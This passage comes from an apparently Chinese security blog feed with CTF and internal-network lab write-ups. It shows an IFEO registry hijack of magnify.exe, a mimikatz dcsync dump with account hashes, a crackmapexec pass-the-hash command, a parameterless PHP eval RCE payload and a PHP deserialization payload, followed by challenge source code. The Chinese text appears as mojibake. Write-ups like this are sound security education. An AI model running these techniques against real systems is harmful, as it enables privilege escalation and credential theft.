alt="image-20251217100829220"></p><p>ç™»å½•è¿›æ¥çš„ç”¨æˆ·éƒ½å¯ä¿®æ”¹ï¼Œæˆ‘ä»¬åˆ©ç”¨æ”¾å¤§é•œææƒ</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM<span class="keyword">\SOFTWARE</span><span class="keyword">\Microsoft</span><span class="keyword">\Windows</span> NT<span class="keyword">\CurrentVersion</span><span class="keyword">\Image</span> File Execution Options<span class="keyword">\magnify</span>.exe&quot; /v Debugger /t REG<span class="built_in">_</span>SZ /d &quot;C:<span class="keyword">\windows</span><span class="keyword">\system</span>32<span class="keyword">\cmd</span>.exe&quot;</span><br></pre></td></tr></table></figure><p><code>type &quot;C:\Users\Administrator\flag\flag02.txt&quot;</code>æ‹¿åˆ°ç¬¬äºŒä¸ªflag</p><p><img src="/../images/achieve/2025/12/image-20251217101034462.png" alt="image-20251217101034462"></p><p>ç„¶åæˆ‘ä»¬åšæ¨ªå‘ï¼Œå…ˆæ”¶é›†è¿™å°æœºå™¨åœ¨åŸŸä¸­çš„å…³ç³»ï¼Œåˆ©ç”¨bloodhoundè¿™ä¸ªå·¥å…·</p><p><img src="/../images/achieve/2025/12/image-20251217101415030.png" alt="image-20251217101415030"></p><p>å¯ä»¥çœ‹åˆ°è¿™å°æœºå™¨ä¹Ÿæ˜¯ä¸€å°åŸŸæ§æœºå™¨ï¼Œå› æ­¤æˆ‘ä»¬ä¸Šä¼ çŒ•çŒ´æ¡ƒç›´æ¥æŠ“å–hash</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="params">#</span> lsadump::dcsync /domain:xiaorang.lab /all /csv</span><br><span class="line">[DC] &#x27;xiaorang.lab&#x27; will be the domain</span><br><span class="line">[DC] &#x27;DC01.xiaorang.lab&#x27; will be the DC server</span><br><span class="line">[DC] Exporting domain &#x27;xiaorang.lab&#x27;</span><br><span class="line">502     krbtgt  3ffd5b58b4a6328659a606c3ea6f9b63        514</span><br><span class="line">1000    DC01<span class="built_in">$</span>   ca4725b5186b3a6699d56662b7a9b7c2        532480</span><br><span class="line">500     Administrator   2c9d81bdcf3ec8b1def10328a7cc2f08        512</span><br><span class="line">1103    WIN2016<span class="built_in">$</span>        a1fbbb8b692fc8bc39c97e6eee719a23        16781312</span><br><span class="line">1104    WIN19-CLIENT<span class="built_in">$</span>   c043da1da4cd586619bc02ff8940d654        16781312</span><br><span class="line">1105    Aldrich c7c654da31ce51cbeecfef99e637be15        512</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘kaliçš„<code>crackmapexec</code>æ‰“Â·å“ˆå¸Œä¼ é€’</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 172.22.8.15 -u administrator -H 2c9d81bdcf3ec8b1def10328a7cc2f08 -d xiaorang.lab -x &quot;type Users<span class="keyword">\Administrator</span><span class="keyword">\flag</span><span class="keyword">\flag</span>03.txt&quot;</span><br></pre></td></tr></table></figure><p>åŸŸæ§ï¼Œæ‹¿åˆ°ç¬¬ä¸‰ä¸ªflag</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é•œåƒåŠ«æŒ </tag>
            
            <tag> CSè¿›ç¨‹æ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2025</title>
      <link href="/2025/12/09/ISCTF2025/"/>
      <url>/2025/12/09/ISCTF2025/</url>
      
        <content type="html"><![CDATA[<h2 id="b-by-n0t1ce-b0ard"><a href="#b-by-n0t1ce-b0ard" class="headerlink" title="b@by n0t1ce b0ard"></a>b@by n0t1ce b0ard</h2><p><code>CVE-2024-12233</code>ç›´æ¥ä¸Šç½‘æœ<a href="https://github.com/LamentXU123/cve/blob/main/RCE1.md">cve&#x2F;RCE1.md åœ¨ä¸»çº¿ Â·LamentXU123&#x2F;cve â€” cve&#x2F;RCE1.md at main Â· LamentXU123&#x2F;cve</a>æ‹¿æ¥ç›´æ¥æ‰“å°±è¡Œ</p><h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;å¸ˆå‚…ï¼Œä½ æƒ³æ‹¿flagï¼Ÿ&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾ˆæ˜æ˜¾å°±æ˜¯ä¸€ä¸ªæ— å‚æ•°rceï¼Œåˆ©ç”¨<code>get_defined_vars()</code>è¿›è¡Œé€ƒé€¸</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=eval(end(current(get<span class="built_in">_</span>defined<span class="built_in">_</span>vars())));<span class="built_in">&amp;</span>b=system(&#x27;tac /f*&#x27;);</span><br></pre></td></tr></table></figure><h2 id="æ¥ç­¾ä¸ªåˆ°å§"><a href="#æ¥ç­¾ä¸ªåˆ°å§" class="headerlink" title="æ¥ç­¾ä¸ªåˆ°å§"></a>æ¥ç­¾ä¸ªåˆ°å§</h2><p>phpçš„ååºåˆ—åŒ–ç›´æ¥æ‰“</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$logfile</span>; <span class="keyword">public</span> <span class="variable">$content</span>; &#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123; <span class="keyword">public</span> <span class="variable">$url</span>; <span class="keyword">public</span> <span class="variable">$logger</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span> = <span class="keyword">new</span> <span class="title class_">ShitMountant</span>();</span><br><span class="line"><span class="variable">$payload</span>-&gt;url = <span class="string">&quot;file:///flag&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="comment">// æ˜¾å¼è®¾ç½®ä¸€ä¸ªéç©ºçš„ã€åˆæ³•çš„ logfile è·¯å¾„</span></span><br><span class="line"><span class="variable">$logger</span>-&gt;logfile = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line"><span class="variable">$logger</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>-&gt;logger = <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST:shark=blueshark:O:12:&quot;ShitMountant&quot;:2:&#123;s:3:&quot;url&quot;;s:12:&quot;file:///flag&quot;;s:6:&quot;logger&quot;;O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:16:&quot;/tmp/notehub.log&quot;;s:7:&quot;content&quot;;s:0:&quot;&quot;;&#125;&#125;</span><br><span class="line"></span><br><span class="line">api.php?id=1</span><br></pre></td></tr></table></figure><h2 id="éš¾è¿‡çš„bottle"><a href="#éš¾è¿‡çš„bottle" class="headerlink" title="éš¾è¿‡çš„bottle"></a>éš¾è¿‡çš„bottle</h2><p>ç»™å‡ºæºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bottle <span class="keyword">import</span> route, run, template, post, request, static_file, error</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> shutil</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># hint: flag is in /flag</span></span><br><span class="line"></span><br><span class="line">UPLOAD_DIR = <span class="string">&#x27;uploads&#x27;</span></span><br><span class="line">os.makedirs(UPLOAD_DIR, exist_ok=<span class="literal">True</span>)</span><br><span class="line">MAX_FILE_SIZE = <span class="number">1</span> * <span class="number">1024</span> * <span class="number">1024</span>  <span class="comment"># 1MB</span></span><br><span class="line"></span><br><span class="line">BLACKLIST = [<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;h&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;j&quot;</span>,<span class="string">&quot;k&quot;</span>,<span class="string">&quot;m&quot;</span>,<span class="string">&quot;n&quot;</span>,<span class="string">&quot;o&quot;</span>,<span class="string">&quot;p&quot;</span>,<span class="string">&quot;q&quot;</span>,<span class="string">&quot;r&quot;</span>,<span class="string">&quot;s&quot;</span>,<span class="string">&quot;t&quot;</span>,<span class="string">&quot;u&quot;</span>,<span class="string">&quot;v&quot;</span>,<span class="string">&quot;w&quot;</span>,<span class="string">&quot;x&quot;</span>,<span class="string">&quot;y&quot;</span>,<span class="string">&quot;z&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;,&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;:&quot;</span>,<span class="string">&quot;?&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_blacklist</span>(<span class="params">content</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;æ£€æŸ¥å†…å®¹æ˜¯å¦åŒ…å«é»‘åå•ä¸­çš„å…³é”®è¯ï¼ˆä¸åŒºåˆ†å¤§å°å†™ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    content = content.lower()</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">any</span>(black_word <span class="keyword">in</span> content <span class="keyword">for</span> black_word <span class="keyword">in</span> BLACKLIST)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_extract_zip</span>(<span class="params">zip_path, extract_dir</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;å®‰å…¨è§£å‹ZIPæ–‡ä»¶ï¼ˆé˜²æ­¢è·¯å¾„éå†æ”»å‡»ï¼‰&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> zipfile.ZipFile(zip_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zf:</span><br><span class="line">        <span class="keyword">for</span> member <span class="keyword">in</span> zf.infolist():</span><br><span class="line">            member_path = os.path.realpath(os.path.join(extract_dir, member.filename))</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> member_path.startswith(os.path.realpath(extract_dir)):</span><br><span class="line">                <span class="keyword">raise</span> ValueError(<span class="string">&quot;éæ³•æ–‡ä»¶è·¯å¾„: è·¯å¾„éå†æ”»å‡»æ£€æµ‹&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            zf.extract(member, extract_dir)</span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;é¦–é¡µ&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row justify-content-center&quot; id=&quot;index-page&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-8 text-center&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body p-5&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“¤&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h2 class=&quot;card-title&quot;&gt;è½»æ¾æŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/h2&gt;</span></span><br><span class="line"><span class="string">                        &lt;p class=&quot;card-text&quot;&gt;ä¸Šä¼ ZIPæ–‡ä»¶å¹¶å®‰å…¨åœ°æŸ¥çœ‹å…¶ä¸­çš„å†…å®¹ï¼Œæ— éœ€è§£å‹åˆ°æœ¬åœ°è®¾å¤‡&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;mt-4&quot;&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;/upload&quot; class=&quot;btn btn-primary btn-lg px-4 me-3&quot;&gt;</span></span><br><span class="line"><span class="string">                                ğŸ“ ä¸Šä¼ ZIPæ–‡ä»¶</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                            &lt;a href=&quot;#features&quot; class=&quot;btn btn-outline-secondary btn-lg px-4&quot;&gt;</span></span><br><span class="line"><span class="string">                                â„¹ï¸ äº†è§£æ›´å¤š</span></span><br><span class="line"><span class="string">                            &lt;/a&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;row mt-5&quot; id=&quot;features&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ›¡ï¸&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å®‰å…¨æ£€æµ‹&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç³»ç»Ÿä¼šè‡ªåŠ¨æ£€æµ‹ä¸Šä¼ æ–‡ä»¶ï¼Œé˜²æ­¢è·¯å¾„éå†æ”»å‡»å’Œæ¶æ„å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;ğŸ“„&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å†…å®¹é¢„è§ˆ&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;ç›´æ¥åœ¨çº¿æŸ¥çœ‹ZIPæ–‡ä»¶ä¸­çš„æ–‡æœ¬å†…å®¹ï¼Œæ— éœ€ä¸‹è½½&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;col-md-4 mb-4&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div class=&quot;card h-100&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;card-body text-center p-4&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;emoji-icon&quot;&gt;âš¡&lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;h4&gt;å¿«é€Ÿå¤„ç†&lt;/h4&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;é«˜æ•ˆå¤„ç†å°äº1MBçš„ZIPæ–‡ä»¶ï¼Œå¿«é€Ÿè·å–å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">                    &lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@route(<span class="params"><span class="string">&#x27;/upload&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_page</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;ä¸Šä¼ é¡µé¢&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;zh-CN&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;ä¸Šä¼ ZIPæ–‡ä»¶&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/style.css&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;header text-center&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;h1 class=&quot;display-4 fw-bold&quot;&gt;ğŸ“¦ ZIPæ–‡ä»¶æŸ¥çœ‹å™¨&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            &lt;p class=&quot;lead&quot;&gt;å®‰å…¨åœ°ä¸Šä¼ å’ŒæŸ¥çœ‹ZIPæ–‡ä»¶å†…å®¹&lt;/p&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    